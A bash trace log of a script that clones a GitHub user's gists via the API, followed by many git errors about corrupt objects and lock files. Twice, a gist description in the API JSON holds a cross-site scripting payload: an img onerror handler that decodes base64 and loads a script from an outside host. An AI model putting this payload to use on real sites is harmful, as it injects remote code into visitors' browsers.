+    "comments_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/d7de8a6d787c81971efc",
+    "forks_url": "https://api.github.com/gists/d7de8a6d787c81971efc/forks",
+    "commits_url": "https://api.github.com/gists/d7de8a6d787c81971efc/commits",
+    "id": "d7de8a6d787c81971efc",
+    "git_pull_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "git_push_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "html_url": "https://gist.github.com/d7de8a6d787c81971efc",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt",
+        "size": 1463
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-20T23:38:09Z",
+    "updated_at": "2015-10-20T23:38:09Z",
+    "description": "<img src=x onerror=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Ii8vbGgubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocGF5bG9hZCk7>",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/d7de8a6d787c81971efc/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/e9b994529bfa1908de2c",
+    "forks_url": "https://api.github.com/gists/e9b994529bfa1908de2c/forks",
+    "commits_url": "https://api.github.com/gists/e9b994529bfa1908de2c/commits",
+    "id": "e9b994529bfa1908de2c",
+    "git_pull_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "git_push_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "html_url": "https://gist.github.com/e9b994529bfa1908de2c",
+    "files": {
+      "yoober": {
+        "filename": "yoober",
+        "type": "text/plain",
+        "language": null,
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober",
+        "size": 67
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-14T16:20:49Z",
+    "updated_at": "2015-10-14T16:20:51Z",
+    "description": "",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/e9b994529bfa1908de2c/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  }
+]'
++ '[' '' ']'
++ [[ 6948 -eq 4 ]]
+++ grep '"raw_url": "'
+++ grep /mandatoryprogrammer/
+++ echo '[
+  {
+    "url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab",
+    "forks_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/forks",
+    "commits_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/commits",
+    "id": "3f5990f294c6fc79ebe071e804411dab",
+    "git_pull_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "git_push_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab.git",
+    "html_url": "https://gist.github.com/3f5990f294c6fc79ebe071e804411dab",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt",
+        "size": 3097
+      }
+    },
+    "public": true,
+    "created_at": "2016-04-15T05:56:37Z",
+    "updated_at": "2016-04-15T05:56:37Z",
+   ++ cut -d '"' -f4
+ "description": "",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/3f5990f294c6fc79ebe071e804411dab/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/d7de8a6d787c81971efc",
+    "forks_url": "https://api.github.com/gists/d7de8a6d787c81971efc/forks",
+    "commits_url": "https://api.github.com/gists/d7de8a6d787c81971efc/commits",
+    "id": "d7de8a6d787c81971efc",
+    "git_pull_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "git_push_url": "https://gist.github.com/d7de8a6d787c81971efc.git",
+    "html_url": "https://gist.github.com/d7de8a6d787c81971efc",
+    "files": {
+      "gistfile1.txt": {
+        "filename": "gistfile1.txt",
+        "type": "text/plain",
+        "language": "Text",
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt",
+        "size": 1463
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-20T23:38:09Z",
+    "updated_at": "2015-10-20T23:38:09Z",
+    "description": "<img src=x onerror=eval(atob(this.id)) id=dmFyIHBheWxvYWQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cGF5bG9hZC5zcmM9Ii8vbGgubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocGF5bG9hZCk7>",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/d7de8a6d787c81971efc/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  },
+  {
+    "url": "https://api.github.com/gists/e9b994529bfa1908de2c",
+    "forks_url": "https://api.github.com/gists/e9b994529bfa1908de2c/forks",
+    "commits_url": "https://api.github.com/gists/e9b994529bfa1908de2c/commits",
+    "id": "e9b994529bfa1908de2c",
+    "git_pull_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "git_push_url": "https://gist.github.com/e9b994529bfa1908de2c.git",
+    "html_url": "https://gist.github.com/e9b994529bfa1908de2c",
+    "files": {
+      "yoober": {
+        "filename": "yoober",
+        "type": "text/plain",
+        "language": null,
+        "raw_url": "https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober",
+        "size": 67
+      }
+    },
+    "public": true,
+    "created_at": "2015-10-14T16:20:49Z",
+    "updated_at": "2015-10-14T16:20:51Z",
+    "description": "",
+    "comments": 0,
+    "user": null,
+    "comments_url": "https://api.github.com/gists/e9b994529bfa1908de2c/comments",
+    "owner": {
+      "login": "mandatoryprogrammer",
+      "id": 5349141,
+      "avatar_url": "https://avatars.githubusercontent.com/u/5349141?v=3",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mandatoryprogrammer",
+      "html_url": "https://github.com/mandatoryprogrammer",
+      "followers_url": "https://api.github.com/users/mandatoryprogrammer/followers",
+      "following_url": "https://api.github.com/users/mandatoryprogrammer/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mandatoryprogrammer/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mandatoryprogrammer/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mandatoryprogrammer/subscriptions",
+      "organizations_url": "https://api.github.com/users/mandatoryprogrammer/orgs",
+      "repos_url": "https://api.github.com/users/mandatoryprogrammer/repos",
+      "events_url": "https://api.github.com/users/mandatoryprogrammer/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mandatoryprogrammer/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "truncated": false
+  }
+]'
++ declare -a 'gist_code_urls=https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt
+https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt
+https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober'
++ '[' 0 -ne 0 ']'
++ '[' '!' 'https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt
+https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt
+https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober' ']'
++ which parallel
++ echo -e '[35mlib/gisthose/clone[37m[1m:[22m [34mFetching Text of All Gists for[37m[1m:[22m [0m[7mmandatoryprogrammer[0m\n[37m[3m'
++ echo -ne '[32m'
++ for afile in ${gist_code_urls[*]}
+++ basename https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt
++ echo -n '[4mgistfile1.txt[24m '
++ for afile in ${gist_code_urls[*]}
+++ basename https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt
++ echo -n '[4mgistfile1.txt[24m '
++ for afile in ${gist_code_urls[*]}
+++ basename https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober
++ echo -n '[4myoober[24m '
++ echo -e '\n[0m'
++ '[' 0 -ne 0 ']'
++ declare -i acnt=0
++ for one in ${gist_code_urls[*]}
++ acnt=1
++ '[' ']'
++ for one in ${gist_code_urls[*]}
++ acnt=2
++ '[' ']'
++ wget -nv -nd -nc --restrict-file-names=ascii --retry-connrefused --random-wait --timeout=22 https://gist.githubusercontent.com/mandatoryprogrammer/3f5990f294c6fc79ebe071e804411dab/raw/f0185b1ab3c5fa1e2cdab3141243781f7d3c523b/gistfile1.txt
++ for one in ${gist_code_urls[*]}
++ acnt=3
++ '[' ']'
++ wget -nv -nd -nc --restrict-file-names=ascii --retry-connrefused --random-wait --timeout=22 https://gist.githubusercontent.com/mandatoryprogrammer/d7de8a6d787c81971efc/raw/4837d3cc43906a4d5661e7ea0d6aefaf08eefad9/gistfile1.txt
++ wget -nv -nd -nc --restrict-file-names=ascii --retry-connrefused --random-wait --timeout=22 https://gist.githubusercontent.com/mandatoryprogrammer/e9b994529bfa1908de2c/raw/618a5d5dccf828e8bc11d5884ae3cb398224bcfe/yoober
+++ seq 1 3
++ for two in `seq 1 $acnt`
++ wait 1
++ for two in `seq 1 $acnt`
++ wait 2
++ for two in `seq 1 $acnt`
++ wait 3
++ break
++ echo -e '[0m[35mlib/gisthose/clone[37m[1m:[22m [42mFinished Cloning All Gists From[37m[1m:[0m [7mmandatoryprogrammer[0m\a'
++ exit 0
++ '[' 0 ']'
++ exit 0
++ echo -n ' [0m'
++ exit 0
++ '[' 0 ']'
++ exit 0
++ echo -n ' [0m'
+ [0m+ exit 0
+]0;super@msi: ~/GIT/decal/githose[01;31msuper@msi[00m:[01;34m~/GIT/decal/githose[00m$ ./gitoh[K[Khose pull mandatoryprogrammer
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+error: object file .git/objects/3e/860849abccf1c435b627b2bb8e8aa1ef33ced1 is empty
+error: object file .git/objects/3e/860849abccf1c435b627b2bb8e8aa1ef33ced1 is empty
+fatal: loose object 3e860849abccf1c435b627b2bb8e8aa1ef33ced1 (stored in .git/objects/3e/860849abccf1c435b627b2bb8e8aa1ef33ced1) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/3e/860849abccf1c435b627b2bb8e8aa1ef33ced1 is empty
+error: object file .git/objects/3e/860849abccf1c435b627b2bb8e8aa1ef33ced1 is empty
+fatal: loose object 3e860849abccf1c435b627b2bb8e8aa1ef33ced1 (stored in .git/objects/3e/860849abccf1c435b627b2bb8e8aa1ef33ced1) is corrupt
+fatal: The remote end hung up unexpectedly
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+remote: Counting objects: 23, done.[K
+remote: Total 23 (delta 13), reused 13 (delta 13), pack-reused 10[K
+remote: Counting objects: 23, done.[K
+remote: Total 23 (delta 13), reused 13 (delta 13), pack-reused 10[K
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+Unpacking objects:   4% (1/23)   Unpacking objects:   4% (1/23)   Unpacking objects:   8% (2/23)   Unpacking objects:   8% (2/23)   Unpacking objects:  13% (3/23)   Unpacking objects:  13% (3/23)   Unpacking objects:  17% (4/23)   Unpacking objects:  17% (4/23)   Unpacking objects:  21% (5/23)   Unpacking objects:  21% (5/23)   Unpacking objects:  26% (6/23)   Unpacking objects:  26% (6/23)   Unpacking objects:  30% (7/23)   Unpacking objects:  30% (7/23)   Unpacking objects:  34% (8/23)   Unpacking objects:  34% (8/23)   Unpacking objects:  39% (9/23)   Unpacking objects:  39% (9/23)   Unpacking objects:  43% (10/23)   Unpacking objects:  43% (10/23)   Unpacking objects:  47% (11/23)   Unpacking objects:  47% (11/23)   Unpacking objects:  52% (12/23)   Unpacking objects:  52% (12/23)   Unpacking objects:  56% (13/23)   Unpacking objects:  56% (13/23)   Unpacking objects:  60% (14/23)   Unpacking objects:  60% (14/23)   Unpacking objects:  65% (15/23)   Unpacking objects:  65% (15/23)   Unpacking objects:  69% (16/23)   Unpacking objects:  69% (16/23)   Unpacking objects:  73% (17/23)   Unpacking objects:  73% (17/23)   Unpacking objects:  78% (18/23)   Unpacking objects:  78% (18/23)   Unpacking objects:  82% (19/23)   Unpacking objects:  82% (19/23)   Unpacking objects:  86% (20/23)   Unpacking objects:  86% (20/23)   Unpacking objects:  91% (21/23)   Unpacking objects:  91% (21/23)   Unpacking objects:  95% (22/23)   Unpacking objects:  95% (22/23)   Unpacking objects: 100% (23/23)   Unpacking objects: 100% (23/23)   Unpacking objects: 100% (23/23), done.
+Unpacking objects: 100% (23/23), done.
+error: cannot lock ref 'refs/remotes/origin/master': Unable to create '/home/super/github/trailofbits/ruby-sslyze/.git/refs/remotes/origin/master.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+From https://github.com/trailofbits/ruby-sslyze
+ ! 1ba003f..abb0767  master     -> origin/master  (unable to update local ref)
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Unable to create '/home/super/github/trailofbits/RaceSanitizer/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+fatal: Unable to create '/home/super/github/github/banana_phone/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+ * [new tag]         v0.2.1     -> v0.2.1
+fatal: Unable to create '/home/super/github/trailofbits/public-reports/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+fatal: Unable to create '/home/super/github/trailofbits/spf-query/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+fatal: Unable to create '/home/super/github/trailofbits/osquery-windows-linking-test/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+remove the file manually to continue.
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+From https://github.com/trailofbits/ruby-sslyze
+   1ba003f..abb0767  master     -> origin/master
+ * [new tag]         v0.2.1     -> v0.2.1
+fatal: Unable to create '/home/super/github/trailofbits/DomTreSat/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Unable to create '/home/super/github/trailofbits/AppJailLauncher/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Unable to create '/home/super/github/github/game-off-2012/.git/ORIG_HEAD.lock': File exists.
+
+Another git process seems to be running in this repository, e.g.
+an editor opened by 'git commit'. Please make sure all processes
+are terminated then try again. If it still fails, a git process
+may have crashed in this repository earlier:
+remove the file manually to continue.
+remote: Counting objects: 104, done.[K
+remote: Compressing objects:  10% (1/10)   [Kremote: Compressing objects:  20% (2/10)   [Kremote: Compressing objects:  30% (3/10)   [Kremote: Compressing objects:  40% (4/10)   [Kremote: Compressing objects:  50% (5/10)   [Kremote: Compressing objects:  60% (6/10)   [Kremote: Compressing objects:  70% (7/10)   [Kremote: Compressing objects:  80% (8/10)   [Kremote: Compressing objects:  90% (9/10)   [Kremote: Compressing objects: 100% (10/10)   [Kremote: Compressing objects: 100% (10/10), done.[K
+Receiving objects:   0% (1/104)   Username for 'https://github.com': Username for 'https://github.com': error: object file .git/objects/49/3419c4e01bdc1cd9dae2cd4dd26f54dd070ab3 is empty
+error: object file .git/objects/49/3419c4e01bdc1cd9dae2cd4dd26f54dd070ab3 is empty
+fatal: loose object 493419c4e01bdc1cd9dae2cd4dd26f54dd070ab3 (stored in .git/objects/49/3419c4e01bdc1cd9dae2cd4dd26f54dd070ab3) is corrupt
+fatal: The remote end hung up unexpectedly
+fatal: Not a git repository (or any of the parent directories): .git
+fatal: Not a git repository (or any of the parent directories): .git
+Receiving objects:   1% (2/104)   Receiving objects:   2% (3/104)   Receiving objects:   3% (4/104)   Receiving objects:   4% (5/104)   Receiving objects:   5% (6/104)   Receiving objects:   6% (7/104)   Receiving objects:   7% (8/104)   Receiving objects:   8% (9/104)   Receiving objects:   9% (10/104)   Receiving objects:  10% (11/104)   Receiving objects:  11% (12/104)   Receiving objects:  12% (13/104)   error: object file .git/objects/49/3419c4e01bdc1cd9dae2cd4dd26f54dd070ab3 is empty
+error: object file .git/objects/49/3419c4e01bdc1cd9dae2cd4dd26f54dd070ab3 is empty
+fatal: loose object 493419c4e01bdc1cd9dae2cd4dd26f54dd070ab3 (stored in .git/objects/49/3419c4e01bdc1cd9dae2cd4dd26f54dd070ab3) is corrupt
+fatal: The remote end hung up unexpectedly
+Username for 'https://github.com': fatal: Not a git repository (or any of the parent directories): .git
+Receiving objects:  13% (14/104)   error: object file .git/objects/03/6566efef3fb06b9c6a02fb04f10d0555b6df4a is empty
+error: object file .git/objects/03/6566efef3fb06b9c6a02fb04f10d0555b6df4a is empty
+fatal: loose object 036566efef3fb06b9c6a02fb04f10d0555b6df4a (stored in .git/objects/03/6566efef3fb06b9c6a02fb04f10d0555b6df4a) is corrupt
+fatal: The remote end hung up unexpectedly
+fatal: Not a git repository (or any of the parent directories): .git
+error: object file .git/objects/ec/424fc37fa73a582f9851092b7f7651c1ba571d is empty
+error: object file .git/objects/ec/424fc37fa73a582f9851092b7f7651c1ba571d is empty
+fatal: loose object ec424fc37fa73a582f9851092b7f7651c1ba571d (stored in .git/objects/ec/424fc37fa73a582f9851092b7f7651c1ba571d) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/78/188a11e9b4e58e58d37b124fd43afcbef90ec8 is empty
+error: object file .git/objects/78/188a11e9b4e58e58d37b124fd43afcbef90ec8 is empty
+fatal: loose object 78188a11e9b4e58e58d37b124fd43afcbef90ec8 (stored in .git/objects/78/188a11e9b4e58e58d37b124fd43afcbef90ec8) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/f2/ce1ed32dbb9dcf3876b420ea703ec48f94f742 is empty
+error: object file .git/objects/f2/ce1ed32dbb9dcf3876b420ea703ec48f94f742 is empty
+error: object file .git/objects/f2/ce1ed32dbb9dcf3876b420ea703ec48f94f742 is empty
+error: object file .git/objects/f2/ce1ed32dbb9dcf3876b420ea703ec48f94f742 is empty
+fatal: loose object f2ce1ed32dbb9dcf3876b420ea703ec48f94f742 (stored in .git/objects/f2/ce1ed32dbb9dcf3876b420ea703ec48f94f742) is corrupt
+fatal: loose object f2ce1ed32dbb9dcf3876b420ea703ec48f94f742 (stored in .git/objects/f2/ce1ed32dbb9dcf3876b420ea703ec48f94f742) is corrupt
+fatal: The remote end hung up unexpectedly
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/7d/27517382ce29007ffaa49129a3e7a0a6c75c05 is empty
+error: object file .git/objects/7d/27517382ce29007ffaa49129a3e7a0a6c75c05 is empty
+fatal: loose object 7d27517382ce29007ffaa49129a3e7a0a6c75c05 (stored in .git/objects/7d/27517382ce29007ffaa49129a3e7a0a6c75c05) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/7d/27517382ce29007ffaa49129a3e7a0a6c75c05 is empty
+error: object file .git/objects/7d/27517382ce29007ffaa49129a3e7a0a6c75c05 is empty
+fatal: loose object 7d27517382ce29007ffaa49129a3e7a0a6c75c05 (stored in .git/objects/7d/27517382ce29007ffaa49129a3e7a0a6c75c05) is corrupt
+fatal: The remote end hung up unexpectedly
+error: object file .git/objects/ec/424fc37fa73a582f9851092b7f7651c1ba571d is empty
+error: object file .git/objects/ec/424fc37fa73a582f9851092b7f7651c1ba571d is empty
+fatal: loose object ec424fc37fa73a582f9851092b7f7651c1ba571d (stored in .git/objects/ec/424fc37fa73a582f9851092b7f7651c1ba571d) is corrupt
+fatal: The remote end hung up unexpectedly
+Username for 'https://github.com': Receiving objects:  14% (15/104)   Receiving objects:  15% (16/104)   Receiving objects:  16% (17/104)   Receiving objects:  17% (18/104)   Receiving objects:  18% (19/104)   Receiving objects:  19% (20/104), 8.01 KiB | 0 bytes/s   Receiving objects:  20% (21/104), 8.01 KiB | 0 bytes/s   Receiving objects:  21% (22/104), 8.01 KiB | 0 bytes/s   Receiving objects:  22% (23/104), 8.01 KiB | 0 bytes/s   Receiving objects:  23% (24/104), 8.01 KiB | 0 bytes/s   error: object file .git/objects/5b/74d5ef8e88caeebaf72c94f0f46f53dad65740 is empty
+error: object file .git/objects/5b/74d5ef8e88caeebaf72c94f0f46f53dad65740 is empty
